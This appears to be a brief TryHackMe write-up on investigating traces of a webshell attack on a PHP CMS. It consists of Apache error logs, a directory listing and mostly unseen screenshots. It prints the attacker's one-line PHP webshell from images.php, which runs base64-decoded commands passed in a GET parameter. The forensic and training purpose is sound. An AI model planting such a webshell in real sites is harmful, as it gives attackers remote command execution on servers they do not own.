<p>July 11, 2025</p>
<h1>Infinity Shell</h1>
<p>Investigate and analyse the traces of an attack from an implanted webshell.
<p>https://tryhackme.com/room/hfb1infinityshell</p>

<img width="1901" height="380" alt="image" src="https://github.com/user-attachments/assets/22b1734b-2771-4861-8816-aae4796299e4" />



```bash
ubuntu@tryhackme:/var/log/apache2$ cat error.log.1
[Thu Mar 06 09:34:46.811473 2025] [mpm_prefork:notice] [pid 13636] AH00163: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations
[Thu Mar 06 09:34:46.811554 2025] [core:notice] [pid 13636] AH00094: Command line: '/usr/sbin/apache2'
[Thu Mar 06 09:36:58.262924 2025] [php:error] [pid 13639] [client 10.11.93.143:51024] PHP Fatal error:  Uncaught mysqli_sql_exception: Access denied for user 'root'@'localhost' in /var/www/html/CMSsite-master/includes/db.php:12\nStack trace:\n#0 /var/www/html/CMSsite-master/includes/db.php(12): mysqli_connect()\n#1 /var/www/html/CMSsite-master/includes/header.php(4): include('...')\n#2 /var/www/html/CMSsite-master/index.php(4): include('...')\n#3 {main}\n  thrown in /var/www/html/CMSsite-master/includes/db.php on line 12
[Thu Mar 06 09:40:17.808815 2025] [mpm_prefork:notice] [pid 13636] AH00170: caught SIGWINCH, shutting down gracefully
[Thu Mar 06 09:40:17.968781 2025] [mpm_prefork:notice] [pid 13810] AH00163: Apache/2.4.58 (Ubuntu) configured -- resuming normal operations
[Thu Mar 06 09:40:17.968958 2025] [core:notice] [pid 13810] AH00094: Command line: '/usr/sbin/apache2'
[Thu Mar 06 09:47:51.884041 2025] [php:error] [pid 13812] [client 10.11.93.143:52031] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:48:00.940830 2025] [php:error] [pid 13823] [client 10.11.93.143:52032] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat
[Thu Mar 06 09:48:14.826398 2025] [php:error] [pid 13820] [client 10.11.93.143:52033] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:48:17.029469 2025] [php:error] [pid 13820] [client 10.11.93.143:52033] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat
[Thu Mar 06 09:48:22.891910 2025] [php:error] [pid 13822] [client 10.11.93.143:52038] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:48:24.849510 2025] [php:error] [pid 13822] [client 10.11.93.143:52038] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat
[Thu Mar 06 09:49:10.337218 2025] [php:error] [pid 13815] [client 10.11.93.143:52043] script '/var/www/html/CMSsite-master/img/images.php' not found or unable to stat, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:50:33.141153 2025] [php:warn] [pid 13812] [client 10.11.93.143:52047] PHP Warning:  Undefined array key "query" in /var/www/html/CMSsite-master/img/images.php on line 1, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:50:33.141215 2025] [php:error] [pid 13812] [client 10.11.93.143:52047] PHP Fatal error:  Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/CMSsite-master/img/images.php:1\nStack trace:\n#0 /var/www/html/CMSsite-master/img/images.php(1): system()\n#1 {main}\n  thrown in /var/www/html/CMSsite-master/img/images.php on line 1, referer: http://10.10.80.94:8080/CMSsite-master/admin/profile.php?section=not_cipher
[Thu Mar 06 09:50:41.547532 2025] [php:warn] [pid 13823] [client 10.11.93.143:52048] PHP Warning:  Undefined array key "query" in /var/www/html/CMSsite-master/img/images.php on line 1, referer: http://10.10.80.94:8080/CMSsite-master/img/
[Thu Mar 06 09:50:41.547600 2025] [php:error] [pid 13823] [client 10.11.93.143:52048] PHP Fatal error:  Uncaught ValueError: system(): Argument #1 ($command) cannot be empty in /var/www/html/CMSsite-master/img/images.php:1\nStack trace:\n#0 /var/www/html/CMSsite-master/img/images.php(1): system()\n#1 {main}\n  thrown in /var/www/html/CMSsite-master/img/images.php on line 1, referer: http://10.10.80.94:8080/CMSsite-master/img/
sh: 1: ifconfig: not found
[Thu Mar 06 15:55:54.026163 2025] [mpm_prefork:notice] [pid 13810] AH00170: caught SIGWINCH, shutting down gracefully
```


```bash
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ ls
'$user_image'                               IMG_20160917_152307.jpg
 10067.jpg                                  acer-aspire-blue-computer-wallpapers-1024x768.jpg
 10958.jpg                                  call-of-duty-games-wallpapers.jpg
 19946.jpg                                  casino-royale-james-bond-wallpaper.jpg
 22497.jpg                                  cms_admin.JPG
 2347033459561.jpg                          cms_admin_categories.JPG
 24-cast-tv-serie-wallpapers-1024x768.jpg   cms_admin_post.JPG
 24195.jpg                                  cms_admin_restrict.JPG
 25501.jpg                                  cms_admin_users1.JPG
 33070.jpg                                  cms_admin_users2.JPG
 36296.jpg                                  cms_front.JPG
 500.JPG                                    comment.jpg
 505.jpg                                    images.php
 9400.jpg                                   post_img.jpg
'BlackBerry 9000521.JPG'                    post_img2.jpg
'Chelsea-me 20151215_142015.jpg'            vimeo.png
 IMG_20160129_145808.jpg                   ''$'\303\242\342\202\254\302\252''+234 803 426 6336'$'\303\242\342\202\254\302\254'' 20151226_180506.jpg'
 IMG_20160214_152546.jpg                   ''$'\303\242\342\202\254\302\252''+234 810 956 2045'$'\303\242\342\202\254\302\254'' 20151007_200625.jpg'
 IMG_20160725_144420.jpg
ubuntu@tryhackme:/var/www/html/CMSsite-master/img$ cat images.php
<?php system(base64_decode($_GET['query'])); ?>
```


<img width="1207" height="532" alt="image" src="https://github.com/user-attachments/assets/a7b9bbe4-3e32-4691-a4d4-535286f76439" />

<img width="1359" height="171" alt="image" src="https://github.com/user-attachments/assets/eb13ef5f-72cc-43ed-b22e-529438c5f954" />

<br>
<br>

<img width="1906" height="885" alt="image" src="https://github.com/user-attachments/assets/edd1c55c-ea0d-429a-b55e-9e05a4f03945" />

<img width="1897" height="895" alt="image" src="https://github.com/user-attachments/assets/5e8415ac-7c65-44f1-b420-c30f457d92ac" />

<br>
<br>




<img width="429" height="287" alt="image" src="https://github.com/user-attachments/assets/1d31aeea-5858-436d-86af-001cc541978c" />

<img width="1904" height="904" alt="image" src="https://github.com/user-attachments/assets/d64e4339-a23d-4ee3-8809-9240229231ff" />

<img width="1884" height="895" alt="image" src="https://github.com/user-attachments/assets/7217cc70-e1db-4ac3-9dd4-b228d561b760" />

<img width="1892" height="888" alt="image" src="https://github.com/user-attachments/assets/f296761d-6486-41f7-ba95-6d3cce311a5d" />


<img width="1896" height="902" alt="image" src="https://github.com/user-attachments/assets/ad7e3eb1-76c3-4bf9-88ef-ea13a21ac8da" />







